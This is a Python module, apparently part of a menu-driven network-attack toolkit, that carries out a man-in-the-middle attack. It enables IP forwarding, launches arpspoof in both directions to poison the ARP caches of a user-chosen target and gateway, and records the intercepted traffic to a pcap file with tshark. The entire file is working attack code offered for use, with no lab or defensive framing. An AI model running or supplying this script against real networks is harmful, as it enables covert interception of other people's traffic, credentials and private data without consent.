import subprocess
import sys
from time import sleep

def arp_spoof(target_ip, gateway_ip, interface="eth0"):
    """Launch ARP spoofing attack using arpspoof."""
    try:
        print(f"\n[+] Starting ARP spoofing (Target: {target_ip}, Gateway: {gateway_ip})")
        # Enable IP forwarding
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        # Start arpspoof
        cmd_target = ["arpspoof", "-i", interface, "-t", target_ip, gateway_ip]
        cmd_gateway = ["arpspoof", "-i", interface, "-t", gateway_ip, target_ip]
        subprocess.Popen(cmd_target)
        subprocess.Popen(cmd_gateway)
        print("[!] ARP spoofing running. Press Ctrl+C to stop.")
        while True:
            sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping ARP spoofing...")
        subprocess.run(["pkill", "arpspoof"])
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
    except Exception as e:
        print(f"[-] Error: {e}")

def sniff_traffic(interface="eth0", output_file="capture.pcap"):
    """Sniff network traffic using tshark."""
    try:
        print(f"\n[+] Sniffing traffic on {interface} (Output: {output_file})")
        subprocess.run(["tshark", "-i", interface, "-w", output_file])
    except Exception as e:
        print(f"[-] Error: {e}")

def mitm_menu():
    """MITM attack menu."""
    while True:
        print("\n=== Man-in-the-Middle ===")
        print("1) ARP Spoofing")
        print("2) Sniff Traffic (Tshark)")
        print("3) Back to Network Attacks")
        choice = input("Select an option: ")

        if choice == "1":
            target_ip = input("Enter target IP: ")
            gateway_ip = input("Enter gateway IP: ")
            interface = input("Enter network interface (default: eth0): ") or "eth0"
            arp_spoof(target_ip, gateway_ip, interface)
        elif choice == "2":
            interface = input("Enter network interface (default: eth0): ") or "eth0"
            output_file = input("Enter output file (default: capture.pcap): ") or "capture.pcap"
            sniff_traffic(interface, output_file)
        elif choice == "3":
            break
        else:
            print("[-] Invalid option.")